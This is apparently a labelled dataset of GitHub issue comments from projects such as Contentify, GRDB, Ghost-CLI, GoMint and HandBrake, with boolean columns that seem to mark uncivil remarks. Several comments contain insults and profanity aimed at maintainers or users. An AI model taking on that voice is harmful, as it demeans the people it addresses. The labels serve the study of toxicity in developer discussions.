BitFunnel/BitFunnel/115/167441961," ==22978== 103,464 (312 direct, 103,152 indirect) bytes in 3 blocks are definitely lost in loss record 22 of 22 ==22978==    at 0x4C2E0EF operator new(unsigned long) (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so) ==22978==    by 0x4F9A38 BitFunnelShardCreateNewActiveSlice() (Shard.cpp111) ==22978==    by 0x4F994A BitFunnelShardAllocateDocument() (Shard.cpp94) ==22978==    by 0x4DB7B0 BitFunnelShardTestShard_Basic_TestTestBody() (ShardTest.cpp105) ==22978==    by 0x53BE40 void testinginternalHandleExceptionsInMethodIfSupported&lt;testingTest, void&gt;(testingTest*, void (testingTest*)(), char const*) (gtest.cc2458) ==22978==    by 0x5202AA testingTestRun() (gtest.cc2474) ==22978==    by 0x521210 testingTestInfoRun() (gtest.cc2656) ==22978==    by 0x5219F6 testingTestCaseRun() (gtest.cc2774) ==22978==    by 0x529C63 testinginternalUnitTestImplRunAllTests() (gtest.cc4649) ==22978==    by 0x53E365 bool testinginternalHandleExceptionsInMethodIfSupported&lt;testinginternalUnitTestImpl, bool&gt;(testinginternalUnitTestImpl*, bool (testinginternalUnitT$ stImpl*)(), char const*) (gtest.cc2458) ==22978==    by 0x529912 testingUnitTestRun() (gtest.cc4257) ==22978==    by 0x559820 RUN_ALL_TESTS() (in /home/leah/dev/BitFunnel/build-make/src/Index/test/IndexTest)  ",False,True,False,BitFunnel/BitFunnel/115
BotTest/samtstern/39/226428395,"[READ] Step 1 Are you in the right place?  For issues or feature requests related to the code in this repository file a Github issue. If this is a feature request make sure the issue title starts with ""FR"".   For general technical questions, post a question on StackOverflow with the firebase tag. For general Firebase discussion, use the firebase-talk google group. For help troubleshooting your application that does not fall under one of the above categories, reach out to the personalized Firebase support channel.  [REQUIRED] Step 2 Describe your environment  Operating System version _ Firebase SDK version _ Library version _ Firebase Product auth  [REQUIRED] Step 3 Describe the problem Steps to reproduce What happened? How can we make the problem occur? This could be a description, log/console output, etc. Relevant Code ",False,True,False,BotTest/samtstern/39
Clementine/clementine-player/5606/201728741,clementine.ico is used to 1)generate icon for clementine.exe (after this clementine.ico is not required anymore) 2)generate icon for Clementine installer (after this clementine.ico is not required anymore) ,False,True,False,Clementine/clementine-player/5606
CoCEd/tmedwards/18/223763235,"Error as follows- [CoCEd 1.3.1.28497, CoC Data 1.0.2_v+_03] System.NullReferenceException Object reference not set to an instance of an object.    at CoCEd.ViewModel.ItemSlotVM.get_Type() in C\Users\tmedwards\Documents\Visual Studio 2015\Projects\CoCEd\CoCEd\ViewModel\ItemVM.csline 109    at CoCEd.ViewModel.GameVM..ctor(AmfFile file, GameVM previousVM, Boolean isRevampMod) in C\Users\tmedwards\Documents\Visual Studio 2015\Projects\CoCEd\CoCEd\ViewModel\GameVM.csline 166    at CoCEd.ViewModel.VM.Load(String path, SerializationFormat expectedFormat, Boolean createBackup) in C\Users\tmedwards\Documents\Visual Studio 2015\Projects\CoCEd\CoCEd\ViewModel\VM.csline 127    at System.Windows.EventRoute.InvokeHandlersImpl(Object source, RoutedEventArgs args, Boolean reRaised)    at System.Windows.UIElement.RaiseEventImpl(DependencyObject sender, RoutedEventArgs args)    at System.Windows.Controls.MenuItem.InvokeClickAfterRender(Object arg)    at System.Windows.Threading.ExceptionWrapper.InternalRealCall(Delegate callback, Object args, Int32 numArgs)    at MS.Internal.Threading.ExceptionFilterHelper.TryCatchWhen(Object source, Delegate method, Object args, Int32 numArgs, Delegate catchHandler) ",False,True,False,CoCEd/tmedwards/18
Contentify/Contentify/398/338891837,"So I installed this for a friend, and already at the installation I noticed that much stuff doesn't work. The current release version has errors with the apache_get_modules function, which is disabled due to security reasons, the script wants access to the php main directory, which a php script NEVER should have access to. And after I gave him all this, I just get that  What the hell. ",True,True,False,Contentify/Contentify/398
Contentify/Contentify/398/402999274,Ok I found the mistake. Ever heard of case sensitive? Apperently not ,True,True,False,Contentify/Contentify/398
Contentify/Contentify/398/403026140,"Hello Contentify is an open source software without any funding or commercial background (currently at least). Creating and maintaining an entire CMS usually keeps whole companies busy over years, costing up to millions of dollars / euros. Lacking these means you have to try to find smart cutoffs. This is why Contentify has zero tests (automatic tests via PHPUnit etc.) and this is why there is no huge testing phase before a new version of Contentify is released. Sometimes this causes error. You faced one of these, because Contentify is developed on Windows, not on Linux. Windows is case insensitive regarding file names. ",False,True,False,Contentify/Contentify/398
Contentify/Contentify/398/403027119,Closing this one. Please stick to constructional criticism if you want to get help. ,False,True,False,Contentify/Contentify/398
Contentify/Contentify/398/403028973,"The fact that you say ""Developt on Windows"" shows me that you have no idea. Case Sensivity is something that everyone should follow, and I am sorry that you don't see that. Here your critic First apache_get_modules is a security issue and by default on most webservers disabled Second Your installer ignores the entry at the MySQL data and tries as root anyways, you have to reload the page and try again for it to work, I would guess thats because you first try to connect before reading and saving the mysql data. Third Case sensivity is something that exists since years, and it became a standard under developers to always keep case sensivity in mind. and last but not least If it was developt on windows and does not work on Linux by nature, you should write that in the requirements. ",False,True,False,Contentify/Contentify/398
Contentify/Contentify/398/403030035,And also thank you for being in the EU and not following the laws. Read it up kiddo DSGVO ,True,True,False,Contentify/Contentify/398
Contentify/Contentify/398/403033160,Oh also btw WoltLab and WordPress are also Open Source and they have way more features. ,False,True,False,Contentify/Contentify/398
Contentify/Contentify/398/403033631,"Another afront, and again you do not care about the reasons. Ofcourse every developer who creates software that typically runs on a Linux OS has to know about the important differences between the target OS and the development OS. Thus however does not guarantee no typos etc are made. Take a look at your own quote, you quoted me wrong (""Developt""). Nothing else happened @ Contentify. A stupid mistake, yes. But if you do not take the circumstances into account you should be very careful with attacking others. And again, you blame others for not creating a perfect software for free. ",False,True,False,Contentify/Contentify/398
Contentify/Contentify/398/403034224,"No I blame you that since more then 24 hours I have nothing but problems with this. And that just because you didn't wrote a capital C , but instead a lowercase one ",True,True,False,Contentify/Contentify/398
Contentify/Contentify/398/403034409,"But whatever, I will fork it, exchange it and do a pull request. Is that enough Constructive critic for you? ",False,True,False,Contentify/Contentify/398
Contentify/Contentify/398/403037205,"Good. Whetever. I don't care. I am not a user of this, a friend asked me to setup it for him and I said yes and since 24 hours I just have problems. I fixed it now, you know about the Case Sensivity error, I don't care about anything else. ",False,True,False,Contentify/Contentify/398
Contentify/Contentify/398/403079902,"Thank you, for reporting the issues and giving explanations why they are issues. Believe it or not, I understand why you are upset. I work as a professional software developer and I’d be very upset if a software that I have bought does not work. But that is the point, this is not the case here. The only “payment” is... if some say “thank you”, I guess. Getting negative feedback is okay but it is frustrating as well if it feels like an attack against the persons that spend their free time on creating something without making any money with it. ",False,True,False,Contentify/Contentify/398
Contentify/Contentify/398/403125138,"Sorry for being a bit harsh. It was just that the tone of your second and third post was quite unfriendly. Honestly, Contentify cannot reach the same high quality level as for example WordPress. WP has a huge community and lots of contributors plus a strong commercial background. None of these is true for Contentify. Therefore, it has no ads ad all, nowhere at all (except of some recommendations which do not generate any money). It does not spy on you or restrict you. DSVGO / GDPR...  If this really is something that interests you, let me ensure you, the only thing you have to worry about is the use of Google Analytics on the contentify.org website. That's the only ""evil"" third party software that is in use. And on our side, we do collect very (extremely?) few client data and we do very (rarely / almost none) analysis of the collected data. And ofcourse we do not sell / share any user data (not including Google Analytics). ",False,True,False,Contentify/Contentify/398
Contentify/Contentify/398/409973397,@friend Do not listen to him this CMS is great and thanks for creating! ,False,True,False,Contentify/Contentify/398
Contentify/Contentify/398/482079135,Update Contentify.org is officially GDPR compliant. ,False,True,False,Contentify/Contentify/398
Corrupted/GameThemedGroup/5/229252528,"void    clear() Deletes all GridElements and reset the counter void    clear(boolean clearGrid, boolean clearCounter, boolean clearLaser) flexible clear method void    clearGrid() Deletes all GridElements ",False,True,False,Corrupted/GameThemedGroup/5
Corrupted/GameThemedGroup/5/302071141,"The clear(boolean, boolean, boolean) method does not seem to clear the counter properly. will try to fix this in main branch. ",False,True,False,Corrupted/GameThemedGroup/5
DSharpPlus/DSharpPlus/282/321360868,"You guys harassed me over PascalCase with ""someone"" being verbally abusive and saying I needed to get help because I showed him my programming trophy. Being rude is one things, being delusional is worse. I get it. You guys got intimidated by me but stop making up shit. ",True,True,False,DSharpPlus/DSharpPlus/282
FastAdapter/mikepenz/695/401854501,"I understand that and really thanks for your explanation. Can you help a little to understand it better if you can... So i have implemented   1)  2) in the SampleItem class there are some variables like   Name, Signal, Width , etc.... How to make some modification to this to be able to make the adapter to sort the items inside it by Signal e.x ? So when new items added, deleted or moved, the adapter to be able to resort they ? It would be really great help if someone provide help for this, because i have writed my self hundred of lines to manually make this but sometime it not working or produce bugs like  ",False,True,False,FastAdapter/mikepenz/695
FastAdapter/mikepenz/695/401855597,"And you won't be able to use FastItemAdapter for that, better use the FastAdapter and add the model adapters to it. ",False,True,False,FastAdapter/mikepenz/695
DSharpPlus/DSharpPlus/282/387556075,Getting defensive? You know what you did. ,False,True,False,DSharpPlus/DSharpPlus/282
Doomsday-Trail/AnthonyMarc23/1/335396060,@friend check it out ,False,True,False,Doomsday-Trail/AnthonyMarc23/1
FastAdapter/mikepenz/695/401856858,"I see, so this is how i use it  This is the item class  FastAdapter   fastadapter.add(new SampleItem(""TKIP"",""-45"",""WPA"");` can you help how to modify the class to automatic sort by signal please, sorry my low English, Best regards. ",False,True,False,FastAdapter/mikepenz/695
FastAdapter/mikepenz/695/337570861,"Hello, i have read this   , truly understand Sort() of arrays, but in some cases the fast adapter should not be clear() , and add new sorted array of items to it, i just wonder if something can be make to support this feature in realtime when we add an item, when delete or when move ... Thanks ",False,True,False,FastAdapter/mikepenz/695
FastAdapter/mikepenz/695/401849860,"Hi, you can provide your own item list implementation to any model adapter. ",False,True,False,FastAdapter/mikepenz/695
FastAdapter/mikepenz/695/401861072,This isn't stackoverflow. ,False,True,False,FastAdapter/mikepenz/695
FastAdapter/mikepenz/695/401858194,"@friend , Without making any modification in the SampleItem class ? Just to call this method ? And how we build  or  because no documentation for that i'm sorry ... ",False,True,False,FastAdapter/mikepenz/695
FastAdapter/mikepenz/695/401857355,`´ ,False,True,False,FastAdapter/mikepenz/695
FastAdapter/mikepenz/695/401852409,"Its basically the interface for the implementation that is managing the items list. You could for example add an own add implementation and call own calculated adapter callbacks. There is currently no documentation for it, thats true. Your implementation would look similar to the default one but without the default behavior you don't want to have. ",False,True,False,FastAdapter/mikepenz/695
FastAdapter/mikepenz/695/401859286,"you have to store the reference of the ModelAdapter somewhere ofc to add item to it. No modification of the items is required for that.  An sample for the interceptor is  for example, but in your case the interceptor will return the value without nay changes. The item list impl is the class i posted before ",False,True,False,FastAdapter/mikepenz/695
FastAdapter/mikepenz/695/401860439,"@friend , hahaha i have 3 days working for that and my head now is totally stucked D D , please if you can rewrite my implementation in the comment above that i have writted my class and implementation how i add or delete items D D D , you don't have other choice hahahaha, thanks ",False,True,False,FastAdapter/mikepenz/695
FastHub/k0shk0sh/2181/394037322,"Proposes several changes to increase ease of reading strings. The general message conveyed has not been changed, but there have been some adjustments  Typos fixed Punctuation added where currently missing Consistency in terms of American/British language (specifically the word ""organizations"") A couple of changes to words which sound better  (cc @friend) ",False,True,False,FastHub/k0shk0sh/2181
FastAdapter/mikepenz/695/401851470,"@friend , any documentation for that or how to use in more detail ? Thank you For example we have a AbstractItem with three data  Title, Signal, Capacity ect .... Just need when make changes to adapter to have the ability to automatic sort by  signal for example or anything else. How can we do that ? ",False,True,False,FastAdapter/mikepenz/695
FastAdapter/mikepenz/695/401854943,"There is already an implementation that is sorting the items after adding, moving ect. ",False,True,False,FastAdapter/mikepenz/695
ForkHub/jonan/56/152861106,@friend Why are the requests unauthenticated? As much as the app is being used wouldn't authenticated requests be better? ,False,True,False,ForkHub/jonan/56
ForkHub/jonan/56/141524566,GitHub's rate limit is quite limited for unauthenticated requests. This might be an issue if we want to implement this feature. ,False,True,False,ForkHub/jonan/56
Flexbones/roikles/61/265723164,Fixed in 846dcdc ,False,True,False,Flexbones/roikles/61
Flexbones/roikles/61/186262270,Came across a situation where it was necessary to add a column to the wordpress post list in the backend to show taxonomies per post and it couldn't be simpler to implement just add the following to the Taxonomy arguments in lib/taxonomies.php ,False,True,False,Flexbones/roikles/61
FastAdapter/mikepenz/695/401866844,"@friend , I just make a joke, i know that no need for clarification, i just need when add item, delete or move in real time (not added to array first) to make the adapter automatically sort those damn items , i am really sad with that. ",True,True,False,FastAdapter/mikepenz/695
ForkHub/jonan/56/152871574,@friend he means requests without login would be unauthenticated (as the authentication is done via the login) and thus rate-limited. ,False,True,False,ForkHub/jonan/56
ForkHub/jonan/56/152887457,Right but basic authentication using the client id and and client secret would be enough for this. ,False,True,False,ForkHub/jonan/56
ForkHub/jonan/56/152824568,Would still be nice to let others you recommend the app (or github in general) to try it. Maybe even before creating an account on github. ,False,True,False,ForkHub/jonan/56
ForkHub/jonan/56/153009651,"@friend ForkHub doesn't use OAuth to authenticate, as I don't want to manage a Client ID and a Client Secret and force contributors to register their own app to obtain new ones. ",False,True,False,ForkHub/jonan/56
ForkHub/jonan/56/153010079,@friend With SideWaffle we just registered it the extension as the app using the Client ID and Client Secret and just allow contributors to use ours. ,False,True,False,ForkHub/jonan/56
ForkHub/jonan/56/153688918,"@friend I'm kind of against OAuth authentication in client applications. It's really hard (we can even argue if at all possible) to keep the Client Secret really secret, and making it public kind of defeats the purpose of OAuth altogether. ",False,True,False,ForkHub/jonan/56
ForkHub/jonan/56/88116510,"Hello, I'd like to browse projects but I'm required to sing in to your app. I'd rather have the app be like reddit, stackover flow, hacker news, etc where a sing-in is not required to browse. Thanks, j ",False,True,False,ForkHub/jonan/56
FrameworkBenchmarks/TechEmpower/1024/40441145,"I removed the dirs in #883, but the dirs were accidentally re-added in when merging PR #1015. ",False,True,False,FrameworkBenchmarks/TechEmpower/1024
FrameworkBenchmarks/TechEmpower/1024/52435722,"Ah, my bad. Thanks for cleaning it up ",False,True,False,FrameworkBenchmarks/TechEmpower/1024
Fuzzymatcher.js/KyleAMathews/1/5472797,"e.g. in the city demo, searching for ""san fran"" should put ""San Francisco"" first not ""San Juan"". Perhaps make the lenenstein distance less important to the total score? ",False,True,False,Fuzzymatcher.js/KyleAMathews/1
GPMS/BoiseProjects/10/117483880,Create a grid to bind all Proposal list ,False,True,False,GPMS/BoiseProjects/10
GRDB.swift/groue/261/264024004,"let itemsAreIdenticalFactory ItemComparatorFactory&lt;Record&gt;         if let isSameRecord = isSameRecord {             itemsAreIdenticalFactory = {  in { isSameRecord($0.record, $1.record) } }         } else {             itemsAreIdenticalFactory = {  in { _ in false } }         } ",False,True,False,GRDB.swift/groue/261
GRDB.swift/groue/261/335293498,"The code has an issue and won’t build for the latest XCode - GRDB.swift-master/GRDB/Record/FetchedRecordsController.swift8847 Unable to infer closure type in the current context     let itemsAreIdenticalFactory ItemComparatorFactory&lt;Record&gt;     if let isSameRecord = isSameRecord {         itemsAreIdenticalFactory = { _ in { isSameRecord($0.record, $1.record) } }     } else {         itemsAreIdenticalFactory = { _ in { _ in false } }     }  ",False,True,False,GRDB.swift/groue/261
GRDB.swift/groue/261/335354687,"I'm sorry but this code builds everyday, without any error, on many setups that conform to the requirements listed at the top of the project's README. Please take the time to provide a proper problem report. ",False,True,False,GRDB.swift/groue/261
GRDB.swift/groue/261/336411556,My little finger tells me you won't reply or close this issue. No news is good news happy GRDB! ,False,True,False,GRDB.swift/groue/261
GRDB.swift/groue/261/344928233,"Hi I found the same issue, the issue is that when we install GRDB through cocoa pod, and then when we try building the application, the build shows error in FetchedRecordsController of grdb. Kindly help us fixing it. I am using xcode 9 and swift 3 ",False,True,False,GRDB.swift/groue/261
GRDB.swift/groue/261/344932239,"Hello @friend. I'll make the same answer as I did to @friend many users, including me, build GRBD through CocoaPods almost daily. And this issue does not happen. So if you want help, please take the time to write a proper problem report. And start by checking the GRDB requirements at the top of the readme file. Thanks. ",False,True,False,GRDB.swift/groue/261
GRDB.swift/groue/261/344972349,"Try downloading and re-importing the latest code build, updating cocoa pods, cleaning your project and restarting xcode. Also, make sure you refresh your frameworks in your build settings. I didn’t want to leave up an answer as the maintainer seemed angry. Hope that helps. Thanks, Sarah ",False,True,False,GRDB.swift/groue/261
GRDB.swift/groue/261/344986635,tried myself on new clean project - everything works fine. Better if you will create sample project where it will be possible to reproduce this issue. ,False,True,False,GRDB.swift/groue/261
GRDB.swift/groue/261/344991933,"Thanks for the feedback, @friend. It may help other users. Now I wasn't angry. When someones opens an issue without any clear question or context, despite my request for details, what can I do? An issue that contains no usable information for other users or for contributors has no value. ",False,True,False,GRDB.swift/groue/261
GRDB.swift/groue/261/344997610,"Hints when a contributor asks for details Provide details. This includes  the version of Xcode, and if other version of Xcode are installed on the computer the flavor of GRBD installed (GRDB, GRDBCipher, GRDBCustom?) the version of GRBD installed (v2.3.1, other?) the installation method (CocoaPods, SPM, Carthage, Manual?) a sign that you have read the requirements and searched the doc for an answer to your question a clear and precise statement of your issue  The list is long. But it can fit in two sentences. For example I guess I'll have to write an issue template some day. Fortunately, I currently don't have to close too many issues as invalid because of their low quality. ",False,True,False,GRDB.swift/groue/261
GRDB.swift/groue/261/389190437,"Wow @friend, Didn't expect such responses as you posted and then giving some hint afterwards. You should work on your attitude pal! Cheers! ",True,True,False,GRDB.swift/groue/261
GRDB.swift/groue/261/390401219,"A disrespectful comment has been deleted, and this issue is now locked it has attracted too many low-quality contributions, and will not bring any useful information to anybody. ",False,True,False,GRDB.swift/groue/261
GSM_AT_commands_parser/MaJerle/5/200647333,"Hello Tilen, I want to ask you, if can i upload any type of file with this drivers? pdf, doxc, jpg ... Best Regards, Saif ",False,True,False,GSM_AT_commands_parser/MaJerle/5
GSM_AT_commands_parser/MaJerle/5/272505926,Lib itself does not care about data sent. Everything is on user. ,False,True,False,GSM_AT_commands_parser/MaJerle/5
GameController/RoboCup-Humanoid-TC/17/223780657,Adding the Rhoban Football Club logo (HL KID team 16) ,False,True,False,GameController/RoboCup-Humanoid-TC/17
Ghost-CLI/TryGhost/678/306712728,"This issue is a  [x] Bug Report [ ] Feature Request  Steps to Reproduce (for a bug report)    What password? No error at this point, especially no error log. Running above from hand works asap btw. works with the following, irrational warning Your template is a mess, so this submission is. Not my fault. PS Also, I had to uninstall Let's encrypt in order to pass SSL step. That should never be required. Bug submission checklist  [ ] Tried to find help in Slack &amp; Docs I do not agree with Slack's ToS [x] Checked for existing issues [ ] Attached log file No error log at this point of installation [ ] Provided technical details incl. operating system They are generated upon error, but no error log at this point of installation  ",False,True,False,Ghost-CLI/TryGhost/678
Ghost-CLI/TryGhost/678/374470489,"Hey @friend Please don't use GitHub for support. This is not a bug with the CLI, but normal UNIX system behaviour were you get asked for your sudo password, as the command is running as . I'm closing this as it's not a bug in the CLI. ",False,True,False,Ghost-CLI/TryGhost/678
Ghost-CLI/TryGhost/678/374471992,"It's obviously not a  password ask and I am not asking for support. I don't know if it's your ignorance or lack of basic knowledge, but it's clearly a cli bug, most likely in . ",True,True,False,Ghost-CLI/TryGhost/678
Ghost-CLI/TryGhost/678/374473925,"FYI you're definitely breaking rule 3 of the CoC Because of other issues, when a sudo command is run, output is proxied through the CLI, so when the sudo password is requested, you don't get the usual command. There was intentional context () to suggest the CLI was asking for the sudo password. Your issue with installing knex-migrator isn't an issue with ghost, rather an issue with NPM and the way it handles installation (on what I'm presuming is node 8) ",False,True,False,Ghost-CLI/TryGhost/678
Ghost-CLI/TryGhost/678/374479131,"Falsely accusing someone being not respectful is a serious defamation. That's shame you personally attack others in order to defend your lack of basic knowledge. My issue is not with installing , but running it from your cli. My issue #678 is related, if not duplicate of issue #378, that was correctly marked as bug by less ignorant and more knowledgable ghost developers than you two. I was respectful until now, but at this point you showed that you don't deserve any kind of respect. At this point, I've lost the interest of ghost, so I've lost the interest in this bug report aswell. No regards. ",False,True,False,Ghost-CLI/TryGhost/678
Ghost-CLI/TryGhost/678/374514271,"Alright....    Nobody accused you 'falsely' you clearly were not respectful    Your issue does neither have a title nor any other description. You were starting this issue with asking what the password is for, which is clearly a support question. This was listed as ""1."", but never followed by a ""2."".  With our issue template we ask you to supply information, which you didn't do. At no point whatsoever did you say which node version, OS, CLI, or Ghost version you're having issue with. Hence there is no way to reproduce what you are experiencing.  Support is only offered by the community in our Slack community and not here on GitHub. We ask you to respect our project and the people that are contributing to it. If - after looking further into it and gathering more necessary information - it turns out to be an issue with the CLI, we can always reopen it again.   ",False,True,False,Ghost-CLI/TryGhost/678
GoMint/GoMint/406/375145193,"Implement timings, add support for multithreading and how much count of thread to be used. For exemple how much thread to use chunks load and generation, to have another threads for ticking and entity movement, etc. Thank you. If you can* ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434016443,There are fixed numbers of threads used in Gomint 1 for async loading/saving/chunk population per world 1 for ticking worlds and entities 1 for networking Timings are on the todo list but they won't be finished any time soon. But they will for the first stable release ,False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434017069,Let's implement for have more threads! ,False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434017209,"And why just release? Will be easy to know what's laggy and not, if you use timings. Too if you implement watchdog. ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434018735,What do you want the threads to be for? ,False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434018887,"Lol, comment if you know what's about. ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434019763,"The fuck are you talking about? You are saying you want more threads, so i'm asking you what you want those threads to be for. If you don't know what you want them to be for, then you are just another 5 year old shouting for something to be added because it sounds good. ",True,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434020009,"""1 for async loading/saving/chunk population per world 1 for ticking worlds and entities 1 for networking"" This use more then 1 and to be configurable. ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434021269,"it uses 3 per default (when you have one world loaded) and i'm fine with that. performance is good enough for everything. when that changes i optimize for the specific problem i have. throwing more threads at something doesn't make it faster, its more likely the opposite due to sync problems, context switching etc. etc. ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434023357,"Actually when move you just see a warning in console without reason ""1012ms for movement or shit"" ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434024047,"there is no warning for movement, there are no warnings with times in them at all O.o ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434024381,"@friend Maybe he means ""Running behind"" ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434025970,"Nop, it's a warning who i got in console every time when i move and it's about level ""ms"" ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434026631,@friend Please give a screenshot or copy and paste the console so we can see the error. ,False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434027127,Test yourself. ,False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434027281,"I don't get the error so i cant, can i? ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/434027861,No i cant. I dont have the error. It doesnt occur for me. So i need YOU (the person claiming to have an error) to show me what it is. ,False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/441235503,Now i started GoMint and just got that that's what i mean. ,False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/441236333,"I just want enter and tha da """,False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/441236651,"And again, what i said about tps ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/441237006,,False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/441265788,"This conversation gets locked due to trolling, ranting or something else. ",False,True,False,GoMint/GoMint/406
GoMint/GoMint/406/441279350,"I wouldn't say it was any of that, I would say it's him complaining that GoMint is running behind and yes that annoys me too ",False,True,False,GoMint/GoMint/406
Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942/286971126,"OS Windows 10 (don't think OS matters here) Issue Descriptions 2334 for #2224 via the ""keep sidebar open"" option created a usability issue with having two identical menus visible.  Google's web player has both of these menus, but doesn't have this issue because it's there's no option to keep the hamburger menu expanded or sidebar open. If I choose to keep the sidebar open, then the other menu should not be visible, but being that it looks like that is part of the google play web page, I don't think that is a feasible option here. I think that you should change this behavior back to mirror exactly as google designed it with only one of these menus visible at a time.  ",False,True,False,Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942
Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942/357407717,"So to be clear, you want me to remove a feature because when you turned it on (it is off by default) you didn't like the UX it gave you.  If you don't like the UX don't use the feature, I put big UI changes like this behind options so that people have the choice to use it or not.  I don't use half the option in this app but I added them so that everyone can use it however they want. TLDR The option stays, some people use it and like it 👍 ",False,True,False,Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942
Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942/357410271,"Having redundant menus display isn't a good UX. Perhaps you missed the point of the feedback.  My feedback is that by implementing that option and when a user enables it they now have two display.  On Google's web app, that isn't an issue because only one is ever displayed.  So if you're going to implement an option such as that, make sure it doesn't introduce a double menu or bad design.  Do you want feedback or not?  based on the tone of your response, it doesn't appear that way. ",False,True,False,Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942
Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942/357410690,"forgot to mention, I want the menu displayed, so I want that feature on, but not if it's also going to display a redundant menu to the right of it. ",False,True,False,Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942
Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942/357419177,"I always like feedback, but constructive feedback.  You're issue can effectively be boiled down to ""I enabled this feature and I don't like what it did, I recommend you remove this feature"" which IMO is barely feedback and definitely not constructive.  If you have a proposal to improve that feature in some way to meet your desired UX then raise that instead. ",False,True,False,Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942
Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942/357430773,"It was constructive. by creating that option, when enabled, it displays two of essentially the same menus, which you haven't acknowledged.  That's not a good UI.  my original post provided constructive feedback to say when that option is enabled, hide the redundant menu to the right of it.  what value does that provide an end user.  please at least acknowledge that i didn't just complain and did provide a recommendation. ",False,True,False,Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942
Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942/357433566,"Dude not trying to be argumentative because I value this app a lot. But I'm telling you from my perspective, the double display of a menu is not a great experience and it was introduced by that menu option.  I'm not telling you it's urgent or should be prioritized.  It's feedback on a feature that was added.  Can you honestly tell me you think having two of the same menus displayed is necessary or useful? ",False,True,False,Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942
HandBrake/HandBrake/1517/410321954,"When an error occurs in the original media stream, that's ""end of file"" as far as handbrake is concerned. Completing the encode at that point, it has a successful result. The question is, why did the decoder stop getting data? The answer is almost always a disk flaw, whether it be a scratch or a fingerprint. Even MakeMKV says it can't read the disk at that point, and aborts. MakeMKV might have recorded more about the nature of the flaw it ITS log, but that's speculation about facts not in evidence. The MakeMKV forum has a topic on common read errors  as far as handbrake is concerned, this was not an error in the encoder, so it will return a zero/success response (if running from the command line) or show a green response in the GUI queue. ",False,True,False,HandBrake/HandBrake/1517
HandBrake/HandBrake/1517/410392065,"I've been a developer for 30 yrs (not open source where nobody can fire me) and all I can say is WOW.  I'll be sure to spread the word I had no idea HB's stance was who cares if source media can be properly read and if we can't catch ALL general failures, literally why would we test for ANY of them - even the most basic PROGRAM INPUT testing.  This is basic friggin I/O, not rocket science and you coded enough to log the issue, someone made a very irresponsible call to not call a total FAILURE TO READ SOURCE only 30 seconds in a success.  I hear Twilight Zone music. ",True,True,False,HandBrake/HandBrake/1517
HandBrake/HandBrake/1517/410339420,"There is a reason we tell people not to try rip directly from discs. libbluray isn't designed for handling copy protection. (Structural protections, deliberate errors etc). MakeMKV is and they have a massive amount of experience that allows them to better detect fatal vs non fatal errors and in many cases recovery / workaround problems much better than pretty much most other tools out there. They'll have a ton of code to handle the thousands of scenarios that now come up and change with every new disc released.   Much in the same way we recommend running stream repair tools before dealing with OTA recordings in HandBrake. There are tools specialised just to that file type. As far as HandBrake can tell, there isn't a problem here so it did the correct thing in not failing the encode. The error here isn't fatal and won't always result in a failed encode. I reckon, if we flagged every decoder error we see, we'd see a 60+% failure rate on encodes across millions of users.  That's never going to end well for anyone, especially when a large percentage of those won't actually have resulted in failed encodes.  So, our options are actually very limited. Unfortunately, looking at the logs is not sufficient to tell if you have good encodes. No matter what software you use, the only way to be sure is to watch the entire file and pay very close attention to it.  Same with MakeMKV. We've seen it be successful but data that it read was incorrect without error due to marks on discs or whatever. ",False,True,False,HandBrake/HandBrake/1517
HandBrake/HandBrake/1517/410392792,"For a developer with 30 years experience, your clearly not showing it as it's a hell of a lot more complicated than ""basic IO"". ",False,True,False,HandBrake/HandBrake/1517
HandBrake/HandBrake/1517/410396830,"Handbrake is not a disk ripper. You are having a problem with ripping a disk. You are attempting to use the wrong tool for the job. There are many examples of this sort of problem in the developer world, that even a ""newbie"" like you have encountered. (yes, I've been programming for over a decade longer than you) A disk ripper (like MakeMKV) would tell you directly that the file isn't readable. It would stop the rip with a failure, if you were using its direct interface. Whatever you're using right now to remove the encryption from the BD is likely logging that there is a problem with the disk. But it only tells handbrake ""end of data"". The program handbrake has no way to differentiate between ""end of data because disk is scratched"" and ""end of data because you reached the end of the file"". What handbrake was asked to do completed properly. What you are feeding handbrake with is where the problem lies. How are the handbrake developers responsible for a program that isn't theirs? ",False,True,False,HandBrake/HandBrake/1517
